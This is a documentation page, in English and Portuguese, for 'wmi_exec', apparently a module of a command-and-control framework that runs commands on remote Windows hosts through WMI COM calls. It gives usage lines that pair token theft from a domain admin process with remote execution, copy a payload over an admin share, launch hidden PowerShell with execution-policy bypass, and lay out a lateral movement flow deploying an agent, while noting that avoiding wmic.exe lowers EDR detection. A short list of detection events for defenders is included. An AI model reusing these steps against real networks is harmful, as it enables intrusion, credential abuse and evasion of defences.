+++
title = "wmi_exec"
chapter = false
weight = 110
hidden = false
+++

## Summary

Executes a command on a **remote Windows host** via WMI `Win32_Process.Create` using direct COM vtable calls — without spawning `wmic.exe`. Authentication uses either the current thread's impersonated token (set by `token_steal`) or explicit NTLM credentials.

- **Platform**: Windows only
- **Needs Admin**: No (requires network access to target + WMI permission on remote host)
- **MITRE ATT&CK**: T1047, T1021.003
- **Dependencies**: Pure ctypes (ole32, oleaut32)
- **Version**: 1.0
- **Author**: @wtechsec

### Arguments

#### target *(required)*
- Description: IP address or hostname of the remote target.
- Example: `192.168.1.10` or `PC01.corp.local`

#### command *(required)*
- Description: Command line to execute on the remote host via `Win32_Process.Create`. Fire-and-forget — redirect stdout to file for output capture.
- Example: `cmd /c whoami > C:\Windows\Temp\o.txt 2>&1`

#### username *(optional)*
- Description: Explicit NTLM credentials (`DOMAIN\user`). Empty = use current thread token (from `token_steal`).
- Default: (empty)

#### password *(optional)*
- Description: Password for explicit auth. Empty = use current thread token.
- Default: (empty)

## Usage

```
# --- Modo 1: token implícito (aplique token_steal antes) ---
token_steal                          # lista processos com tokens de domínio
token_steal 1884                     # impersona token de domain admin
wmi_exec 192.168.1.10 "cmd /c whoami > C:\Windows\Temp\o.txt 2>&1"
download 192.168.1.10 C:\Windows\Temp\o.txt

# --- Modo 2: credenciais explícitas ---
wmi_exec 192.168.1.10 "cmd /c net user" CORP\administrator P@ssw0rd

# --- Deploy de agente lateral ---
# 1. Copia payload via share (com token impersonado)
shell copy C:\Windows\Temp\a.ps1 \\192.168.1.10\C$\Windows\Temp\a.ps1
# 2. Executa via WMI (sem wmic.exe)
wmi_exec 192.168.1.10 "powershell -ep bypass -WindowStyle Hidden -f C:\Windows\Temp\a.ps1"
```

## Technique Detail

```
1. CoInitializeEx(COINIT_MULTITHREADED)
2. CoInitializeSecurity(RPC_C_IMP_LEVEL_IMPERSONATE)
3. CoCreateInstance(CLSID_WbemLocator) → IWbemLocator
4. IWbemLocator::ConnectServer(
       "\\\\<target>\\root\\cimv2",
       user, pass          ← NULL = usa token atual do thread
   ) → IWbemServices
5. CoSetProxyBlanket(IWbemServices, AUTHN_WINNT, IMP_IMPERSONATE)
6. IWbemServices::GetObject("Win32_Process") → IWbemClassObject
7. IWbemClassObject::GetMethod("Create") → ppInSignature
8. ppInSignature::SpawnInstance() → pInParams
9. pInParams::Put("CommandLine", VT_BSTR, command)
10. IWbemServices::ExecMethod(
        "Win32_Process", "Create", pInParams
    ) → pOutParams
11. pOutParams::Get("ReturnValue") → 0 = success
12. pOutParams::Get("ProcessId")   → PID do processo criado
```

## MITRE ATT&CK Mapping

- **T1047** — Windows Management Instrumentation
- **T1021.003** — Remote Services: Distributed Component Object Model

## Notes

- **Sem wmic.exe:** a implementação usa vtable COM direta (`ole32`/`oleaut32`). Não gera processo filho `wmic.exe` — reduz surface de detecção por EDR baseado em imagem de processo.
- **Token implícito:** se `token_steal <pid>` foi executado antes, o thread já tem um token de domínio impersonado. `ConnectServer` com `user=NULL/pass=NULL` autentica no namespace WMI remoto usando esse token.
- **Fire-and-forget:** `Win32_Process.Create` é assíncrono — o retorno indica que o processo foi criado, não que completou. Sempre redirecione stdout para arquivo e faça `download` depois.
- **Requisitos de rede:** TCP/135 (RPC endpoint mapper) + portas dinâmicas RPC no alvo. Firewall Windows padrão bloqueia WMI remoto — verifique se o alvo tem a regra "Windows Management Instrumentation (WMI-In)" habilitada.
- **ReturnValue codes:** 0=Success, 2=Access Denied, 3=Insufficient Privilege, 8=Unknown, 9=Path Not Found, 21=Invalid Parameter.
- **Detecção (blue team):** Microsoft-Windows-WMI-Activity/Operational Event ID 5857/5858/5859 + Sysmon Event ID 20 (WmiEvent). Logs no host **alvo**, não na origem.

### Lateral Movement Flow

```
1. token_steal                          → identifica processo de domain admin
2. token_steal <pid>                    → impersona token
3. wmi_exec 192.168.1.10 "cmd /c whoami > C:\Temp\o.txt 2>&1"
4. download 192.168.1.10 C:\Temp\o.txt → confirma execução como domain admin
5. wmi_exec 192.168.1.10 "powershell -ep bypass -f C:\Temp\a.ps1"
                                        → deploy Anubis no host lateral
```

---

## Resumo em Português (PT-BR)

Executa comandos em hosts Windows remotos via WMI (`Win32_Process.Create`) usando chamadas diretas ao vtable COM — sem spawnar `wmic.exe`. Suporta dois modos de autenticação:

| Modo | Configuração | Quando usar |
|---|---|---|
| **Token implícito** | username/password vazios | Após `token_steal` impersonar domain admin |
| **Credencial explícita** | username=`DOMAIN\user` + password | Quando credenciais NTLM estão disponíveis |

### Notas operacionais

- O processo é criado de forma assíncrona — redirecione stdout antes de executar
- Sem `wmic.exe` no processo pai — fingerprint menor para EDR
- Logs ficam no **host alvo** (WMI-Activity EventLog), não na origem
- Requer TCP/135 + portas RPC dinâmicas no alvo (regra de firewall WMI-In)
